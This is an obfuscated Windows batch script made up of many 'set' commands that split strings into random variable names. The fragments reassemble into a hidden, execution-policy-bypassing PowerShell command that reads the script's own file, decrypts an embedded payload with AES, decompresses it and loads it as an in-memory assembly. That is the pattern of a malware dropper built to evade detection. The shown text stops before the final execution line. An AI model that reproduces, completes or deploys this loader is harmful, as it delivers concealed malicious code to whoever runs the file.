@echo off
set "MTtXyzbNaw=1."
set "ciJuYGWlUf=ws"
set "DKsputRRcu=he"
set "NHFQRKGRJP=st"
set "nmVIjJYtTk=ow"
set "rRmrqQcQio=0\"
set "PCvVsoMOjt=nd"
set "TQydnmkQrC=y "
set "zIcfmUSWoK=do"
set "wzmaVxsZYG=co"
set "lnwlAIfoEP=ll"
set "EbglKyHTZA=s\"
set "ezbJXJfPlC=rS"
set "sfQkcSJFAc=Po"
set "WDdhHmCcYy=.e"
set "Hroixgthck=rs"
set "XhLcLaRrpG=py"
set "EQlwFXkaoB=po"
set "HTOJCgHyhp=32"
set "RKuYwWvqta=\W"
set "XGzsbTdhnt=\v"
set "qJDJHsTzNa=we"
set "RgEwAUSnZU=Sy"
set "oayzfHnDJY=ll"
set "kuduPjIpMC=we"
set "DcYeKdLFUM=xe"
set "woirjAvPke=:\"
set "JVhmLGSPcP= /"
set "QnYYPVIXsB=he"
set "rqkrcNvklU=em"
set "RPkjjAWnuM=in"
set "WCATzpKdBG=Wi"
set "ahNyQBkgdp= C"
set "urEkejCVxW=cd"
set "MaouGdfDHA= %~dp0"
set "tgJCOgzlqU=3); "
set "pZdQxknvNt=pStr"
set "pbZwywGIKT=CGmV"
set "vQlWkQdjUj=JHxS"
set "HfrUhKvUXi=);$C"
set "kFNUfmDUmc=ck($"
set "BAKPJRUSOc=n.Pa"
set "wsWCbodmau=Bmor"
set "VaELzSUxwd=tryP"
set "lBTmYXTkEk=Comp"
set "NMwnbbozae='dqR"
set "BfrgXXsFam=w = "
set "zgRqZKiuVz=$aIQ"
set "uMoLnjPncQ=trea"
set "XTAwpCKWSw=] -j"
set "fVNInwsTdC=ypto"
set "EppwjhISFs=onve"
set "zfafSvTKQR=-nop"
set "UtsruHInio=WSwH"
set "tTbhnsHfUj=comm"
set "DuTYPgfELc=..-1"
set "UgHXwNlvPL=;$ww"
set "QQjrDmIOCn=ment"
set "ZxifNwyIkY=.IO."
set "sdsITYHteH=;$GT"
set "MeclTkLYUI=-Obj"
set "ixRqjupACI=se()"
set "UIXwGigqFx=pose"
set "YgthoFXOVu=Star"
set "eqUWAyNDCA=tLW "
set "tFIeuzRjjb=ode]"
set "bqTuQxFBXI=::De"
set "QeQJGhqhAa=yste"
set "VZZUZTLewY=LW.T"
set "tairTzmpGr=nirt"
set "YzdwroRayp=ddin"
set "MpIJBfyJOH=m.Re"
set "IoZtJiZRib=zw.D"
set "cbkxERgAva=bypa"
set "tTQVEbivEP= = N"
set "QDkgCNNhXc=esFX"
set "JXbHOfElTR=ptor"
set "DMjYDtyiYA=ct S"
set "GDvmqmEnBz=ion."
set "QDiaIbBZPQ=($WS"
set "aswBpmCFcY=tion"
set "RQdMgNDHuV=iron"
set "WhZUsDxFcA=T) {"
set "dDnGktShuo=y]::"
set "VBLTxpprRB=.Cry"
set "RepgIHBlmd=ZYYc"
set "sqNyRbrvPu=1] -"
set "RZNUPgrOSb=16] "
set "hTuSwBTTWt=ress"
set "JlSHRJIKwH=d;$C"
set "lBsPzrQBpy=null"
set "EQbgIWnCvO=LCt."
set "vwuKmHWvYa=TLCt"
set "BLVxnjMjXR=:: '"
set "AGXqXpQoey=tem."
set "NkaQgZgenh=tem."
set "sifwsYjUKF=SW);"
set "RrUbBvUsfI=File"
set "pFenkBGsAE=, (,"
set "JhHGAVfQmZ=GmVn"
set "VmIORdVeIE=g = "
set "tJNbNRwoOe=-4] "
set "LtmTqyyxQz=fmH "
set "XVLqvCGbZc=wHL "
set "NvpKHXWXHN=O.Me"
set "YsskSEFtgH=qZLL"
set "acLlIjfRlU=[Env"
set "MczXNAQCET=.Dis"
set "fWgrejJRWF=am;$"
set "TwdEbMetsV=-joi"
set "eGQFlGwCUZ= = $"
set "gNYVxuwaUe=n ''"
set "vvtCGOHAll=sion"
set "ZsWfIgTXWd=New-"
set "GrSXBRlqve=stem"
set "mNmnADOKVV=();$"
set "CTGPDncxJo=('da"
set "LORLLvzLtR=BC;$"
set "BCsJgbcNku=;$Yq"
set "tqDvGumVhz=;$Yq"
set "KxFXObFmks=.Mem"
set "bHQzSibPVz=e = "
set "zoeYZXhcik=t Sy"
set "yorUqWJdZy=rtS4"
set "BAQRujMTZo== [S"
set "hHZoQWEdGs=;$qZ"
set "JWgyLqHGnu=ecry"
set "VJdlnGzqre=; };"
set "SBOFwcEZHt=e]::"
set "ckAylbgVEP=W = "
set "KRteXlsXMQ=.Key"
set "dLDdWMDTCL=Obje"
set "KwovvMaZCf=.Con"
set "bpFMYjdoHZ=orF'"
set "JOIoIfPQCU=GmVn"
set "zrfTmnduaU=$qZL"
set "cSTBylxIko=Disp"
set "cEJnsINWxj=Byzw"
set "TZlLrZDOOY=ddin"
set "CtvFrLyVBW===')"
set "LwqvQejEkE=ose("
set "daobmNDzIw=mory"
set "TjKVEZPfUW=6esa"
set "pzhNJgrmpV=+hAO"
set "OPkOMYQlwk=New-"
set "wuRimFLRDs=);$G"
set "GOjmUwmzSy= = ["
set "pgegnsPxjk=UGTu"
set "DiYUoHSUvQ=ress"
set "wgfrDJtNSE=F'[-"
set "QYYNlOMxME=);$C"
set "UPVpGNuWpL=[-1."
set "vbUNHjacjm=nT ="
set "ytwSiRteoL=and "
set "DRwZipUXLM=Invo"
set "TSULXoRVXF=Secu"
set "SVZlAjweFB=ewLi"
set "hCVgpeDGSe=H.En"
set "XUozJRdmSQ=daeR"
set "mRqPPDqrjK=736u"
set "EZBDCwlVWk=Syst"
set "CTDOmYVTxO=pres"
set "UpYeIzqMIK=gC.T"
set "kZTEfWbkHy=th('"
set "qpAQbCPVDc=vert"
set "iHIQZbclqB=em.C"
set "oxkMiHIjwk=Disp"
set "SdbuPcwPJJ= '')"
set "PZIZqNAPcs=urit"
set "plSsdBrgHM== $C"
set "SgbpVTuzzK=)($J"
set "PlepTydlLD=);$a"
set "GnlyqneTWG=3HWs"
set "BDAuLixTkE= = $"
set "sqEoActiFr=W, 0"
set "ClQzModehe=k; }"
set "QyBrANLMzm=raph"
set "dudlYynTZG= [Sy"
set "pfrmxcsyLx=($WS"
set "FgeTETescg=ert]"
set "WtPYzwsCew=LF, "
set "SwpoNXncnQ=7;$C"
set "Aopdgycygm=tem."
set "ouNvckwvPP='[-1"
set "NPMICOAfgh=7Yiv"
set "IFHISygGNZ=join"
set "RpJRGWbhqR=S46e"
set "BmMSrMxutP=[IO."
set "cHtpdwLvHD=in $"
set "PIblJvzDZB=Comp"
set "LdersQvuhw=embl"
set "pSHniXAUzP=ress"
set "PlIEgUrqJR=1..-"
set "iQalPVYNQf=m(, "
set "kmFAzhfCGy=rt]:"
set "ItJobQptLW=]::N"
set "LgHIVBqMEb=Obje"
set "usMNgUHzXz=wHL."
set "kSDYvbpKev=..-1"
set "ERlKjaULlB=W = "
set "EZwWcaGBMj='[-1"
set "ujexYKwNDl=raph"
set "XLbiSKZyWd=yTo("
set "bXeIgaflkj=HxSW"
set "TSpdoakkZr=F = "
set "UMMYxhJjkj=vj0m"
set "QHtBDtpcmO=::('"
set "uKSLGlkbbb=comp"
set "bvqKnkHpEO=rans"
set "MuYPYJyKMd=pher"
set "XXhEorxfxH=L.Su"
set "LxgNCRVsJY=$Yqt"
set "JjIeJipkPA=SW ="
set "jaGmCqDmPb= [Sy"
set "MyAQxXGpDb=('%~f0'"
set "zLCfftdSVb=ay()"
set "OjcASCapJD= '')"
set "TNArWgEplL=oin "
set "kBCfRkPksh=[Sys"
set "UJRvPYgAIR=eam("
set "tELEhjhDxT=yste"
set "cFOcqZOQXP=ew-O"
set "tUxNiTlZMT=esMa"
set "IEgtmOkRMa=V = "
set "ZdhpjeFaCX=em.I"
set "yWTszBvTKm=.Dis"
set "eQaSOujwyn=tS46"
set "azQMojomFo=lit("
